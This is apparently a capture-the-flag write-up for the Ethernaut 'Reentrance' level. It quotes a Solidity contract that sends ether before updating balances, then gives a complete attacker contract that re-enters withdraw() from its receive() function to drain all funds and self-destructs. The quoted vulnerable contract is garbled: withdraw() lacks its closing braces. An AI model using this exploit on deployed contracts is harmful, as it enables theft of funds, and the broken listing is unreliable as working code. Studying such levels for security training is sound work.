# Type - Beyond the console

***


# The goal of this level is for you to steal all the funds from the contract.

Things that might help:

  * Untrusted contracts can execute code where you least expect it.
  * Fallback methods
  * Throw/revert bubbling
  * Sometimes the best way to attack a contract is with another contract.
  * See the "?" page above, section "Beyond the console"

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;

  receive() external payable {}

# Solution

1. Get a new instance
2. To exploit the contract we can focus on the withdraw() function and make the exploit
3. To gain advantage , we create a new smart contract ,giving the address of the Reentrance smart contract as a parameter in the constructor , we then create a fnction called  as attack where we send some eth triggering the deposit function in Reentrance and then we call the withdraw function, which should send back some eth to the hack contract which should trigger the fallback function inside which  we perform withdrawal again

```
contract Hack {
  Reentrance private target;

  constructor(address payable  _target){
    target = Reentrance(_target);
  } 

  function attack() external payable{
    target.donate{value: 1e18}(address(this));
    target.withdraw(1e18);

    require(address(target).balance ==0, "target balance >0");
    selfdestruct(payable(msg.sender));
  }

  receive() external payable {
    uint amount = min(1e18, address(target).balance);
    if( amount >0){
      target.withdraw(amount);
    }
    
   }

  function min(uint x, uint y) private  pure  returns(uint){
    return x <= y ? x : y ;
  }

}
```
